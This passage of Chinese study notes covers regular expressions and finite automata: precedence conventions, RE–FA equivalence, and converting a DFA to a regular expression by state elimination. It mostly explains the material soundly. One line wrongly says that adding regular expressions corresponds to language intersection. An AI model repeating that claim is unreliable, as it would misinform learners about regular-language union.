class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mn>00</mn><mo stretchy="false">}</mo><mo stretchy="false">{</mo><mn>00</mn><msup><mo stretchy="false">}</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\{00\}\{00\}^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mord">0</span><span class="mclose">}</span><span class="mopen">{</span><span class="mord">0</span><span class="mord">0</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span></p><blockquote><p>两个语言相乘</p></blockquote></li><li><p><img src="../AppData/Roaming/Typora/typora-user-images/image-20211110232604143.png" alt="剩下的例子" /></p></li></ol><h3 id="约定"><a class="markdownIt-Anchor" href="#约定"></a> 约定</h3><ol><li><p>r的正闭包<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>r</mi><mo>+</mo></msup></mrow><annotation encoding="application/x-tex">r^+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.771331em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.771331em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span></span></span></span></span></span></span></span>表示r与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msup><mi>r</mi><mo>∗</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(r^* )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>的乘积以及<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msup><mi>r</mi><mo>∗</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(r^*)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>与r的乘积</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>r</mi><mo>+</mo></msup><mo>=</mo><mo stretchy="false">(</mo><mi>r</mi><mo stretchy="false">(</mo><msup><mi>r</mi><mo>∗</mo></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msup><mi>r</mi><mo>∗</mo></msup><mo stretchy="false">)</mo><mi>r</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">r^+=(r(r^* ))=((r^* )r)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.771331em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.771331em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span></span></span></span></p></li><li><p>闭包运算的优先级最高，乘运算的优先级次之，加运算的优先级最低。所以在乘法明确时，可以使用省略一些括号。</p></li></ol><p>​<img src="https://upyun.wuuconix.link/image-20211110232948907.png" alt="括号省略" /></p><ol start="3"><li>在意义明确时，RE，r表示语言记为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>r</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(r)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span></span></span></span>，也可直接记为r。</li><li>加 乘 闭包运算均执行左结合规则。</li></ol><h3 id="相等的定义"><a class="markdownIt-Anchor" href="#相等的定义"></a> 相等的定义</h3><p>如果两个正则表达式产生的原因是相同的，则称两个正则表达式相等或者等价。</p><h3 id="基本结论"><a class="markdownIt-Anchor" href="#基本结论"></a> 基本结论</h3><p><img src="https://upyun.wuuconix.link/image-20211110233319877.png" alt="结论1" /></p><p><img src="https://upyun.wuuconix.link/image-20211110233734425.png" alt="结论2" /></p><p><img src="https://upyun.wuuconix.link/image-20211110233923226.png" alt="结论3" /></p><h3 id="re与fa等价"><a class="markdownIt-Anchor" href="#re与fa等价"></a> RE与FA等价</h3><p>正则表达式r成为FA M等价，如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>r</mi><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mo stretchy="false">(</mo><mi>M</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(r)=L(M)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span></p><blockquote><p>实际上就是两者产生的语言若是相同的，就叫做等价了</p></blockquote><h3 id="re到fa等价变化的例子"><a class="markdownIt-Anchor" href="#re到fa等价变化的例子"></a> RE到FA等价变化的例子</h3><p><img src="https://upyun.wuuconix.link/image-20211110234200710.png" alt="例子1" /></p><p><img src="https://upyun.wuuconix.link/image-20211110234245060.png" alt="例子2" /></p><blockquote><p>这里貌似遵循了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>N</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">\epsilon-NFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">A</span></span></span></span>要将多个终结状态转移到一个上的规定</p></blockquote><p><img src="https://upyun.wuuconix.link/image-20211110234356530.png" alt="例子3" /></p><h3 id="定理4-1"><a class="markdownIt-Anchor" href="#定理4-1"></a> 定理4-1</h3><p>RE表示的语言是RL。</p><p>个人感觉这个定理的证明反而不重要，而我们需要记住一些RE对应的FA。</p><ol><li><p>若没有任何运算符，即没有加法、乘法或者闭包 的FA</p><p><img src="https://upyun.wuuconix.link/image-20211110235231900.png" alt="闭包" /></p><p>从这里我们可以看到空串和空集的区别。如果一个语言中包含空串，那么相当于空串是一个合法的句子，即不用读入任何输入字符就可以得到一个合法的句子，到了接受状态。</p><p>而如果一个语言是一个空集，相当于你无论接受什么输入字符，都不会到达接受状态，相当于这个语言不接受任何句子。即它的接受状态是孤立无援的。</p></li><li><p>若两个正则表达式相加 的FA</p><p><img src="https://upyun.wuuconix.link/image-20211110235639696.png" alt="相加" /></p><p>RE相加实际就是语言相交，即这个语言的某个句子是接受的，那个语言的某个句子也是接受的，所以我们可以从图中看到，本来两个语言的终止状态<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>f</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">f_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>f</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">f_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>现在同时指向了新的接受状态<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span></span></span></span>。</p></li><li><p>若两个正则表达式相乘 的FA</p><p><img src="https://upyun.wuuconix.link/image-20211110235914742.png" alt="相乘" /></p><p>相乘需要这个语言中取一个句子，那个语言中取一个句子，即笛卡尔乘积。最终拼接形成的新的句子是被接受的。</p></li><li><p>正则表达式的克林闭包</p><p><img src="https://upyun.wuuconix.link/image-20211111000112250.png" alt="克林闭包" /></p><p>可能直接从开始状态直接到接受状态，因为克林闭包包含空串</p><p>也可能在读入无数个字符。</p></li></ol><h3 id="定理4-2"><a class="markdownIt-Anchor" href="#定理4-2"></a> 定理4-2</h3><p>RL可以用RE来表示。</p><p>我们先来看一下一个用RE来表示一个RL的实际例子。</p><p><img src="https://upyun.wuuconix.link/image-20211111183515226.png" alt="DFA" /></p><p><img src="https://upyun.wuuconix.link/image-20211111183509041.png" alt="RE" /></p><p>我们可以看到一个由DFA描述的正则语言最后可以用一串正则表达式来表示。</p><p>下面我们利用“图上作业法”一步一步将DFA进行转化，得到最后的正则表达式。</p><ol><li><p>首先我们需要对DFA进行预处理。</p><p><img src="https://upyun.wuuconix.link/image-20211111183815473.png" alt="预处理" /></p><p>我们看到预处理干的时期实际上就是用一个X状态指向原来的初始状态<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。然后将原来的两个终止状态<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">q_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">q_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>指向状态Y。这些指向都用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>来转移。</p><p>如果原本的DFA中有不可达状态的话，还还需要在预处理中直接去掉不可达状态（从初始状态无法到达的状态叫做不可达状态）</p></li><li><p>然后需要对预处理后的图进行一系列循环操作，这里操作主要分为并弧和去状态。</p><p><img src="https://upyun.wuuconix.link/image-20211111184247739.png" alt="去状态q3" /></p><p>直接把<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">q_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>去掉了，所以以前经过<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">q_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的顶点的弧需要重新进行指向。</p><p>比如之前<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>可以通过<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">q_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>到达<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span></span>状态和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">q_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>状态。现在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">q_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>没有了，需要<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>来直接指向<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">q_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>然后弧上直接用正则表达式来表示，比如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>经过<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">q_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>到达<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span></span>的时候，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">q_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>可能会进行自转，这里用的是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>0</mn><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">0^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>的正则表达式来表示。</p><p><img src="https://upyun.wuuconix.link/image-20211111184731066.png" alt="去状态q4" /></p></li></ol><p><img src="https://upyun.wuuconix.link/image-20211111184753178.png" alt="并弧" /></p><p>之前去掉状态<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">q_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">q_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>都属于“去状态”的操作。这里我们遇到了第二种操作“并弧”。实际很简答， 如果两个状态之间有两条并行的弧，可以用正则表达式中的&quot;+&quot;来进行合并。</p><p>接下来就是同样的操作了，实际上你去状态的顺序和并弧的顺序可以任意，看哪个状态不顺眼就去它。一直循环往复，最后剩下X到Y只有一条弧的时候，工作就结束了，弧上的正则表达式就是我们最后的结果。</p><p><img src="https://upyun.wuuconix.link/image-20211111184942120.png" alt="去状态q0" /></p><p><img src="https://upyun.wuuconix.link/image-20211111185713670.png" alt="并弧u" /></p><p><img src="https://upyun.wuuconix.link/image-20211111185737163.png" alt="去状态q1" /></p><p><img src="https://upyun.wuuconix.link/image-20211111185752853.png" alt="去状态q2" /></p><p>值得注意的是，因为在过程中选择哪个状态去除以及那两条边与合并，这里每个人的顺序可能会不一样，这就会导致最终的正则表达式在形式上看起来是不同的，但是实际上它们都是等价的。</p><p>如果化到最后发现X无法到达Y，我们认为它的正则表达式是<span 